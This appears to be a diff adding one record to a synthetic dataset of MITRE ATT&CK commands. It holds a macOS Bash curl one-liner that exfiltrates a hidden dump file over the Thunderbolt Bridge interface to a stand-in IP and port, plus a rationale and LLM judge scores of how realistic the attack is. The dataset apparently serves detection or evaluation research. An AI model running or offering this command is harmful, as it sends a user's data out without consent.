@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
+  "explanation": "Uses the Thunderbolt Bridge interface for HTTP POST exfiltration by explicitly binding curl to that alternate medium (T1011).",
+  "rationale_steps": [
+    "Fetch Thunderbolt Bridge IP with networksetup",
+    "Bind curl to the Thunderbolt interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f3051136",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid flags, and correct command substitution.",
+        "semantic_score": 3,
+        "semantic_justification": "It attempts to exfiltrate via an alternate interface by binding curl to the Thunderbolt Bridge address, but the awk pattern may return multiple/IPv6 addresses breaking --interface and binding by IP may not reliably force use of that medium.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:03:57.764300Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes and parentheses, valid curl flags (--interface, -X, --data-binary), and a properly structured command substitution using networksetup piped to awk.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly uses curl's --interface flag to bind to the Thunderbolt Bridge IP address for exfiltration over an alternate network medium, which aligns well with T1011, though Thunderbolt Bridge is typically a peer-to-peer local interface rather than a true alternate network medium like cellular or Wi-Fi, slightly reducing operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:05:05.591472Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, correctly nested subshells, balanced quotes, and proper curl flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively binds curl to a specific network interface to force exfiltration over an alternate medium, perfectly aligning with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:05:07.861467Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
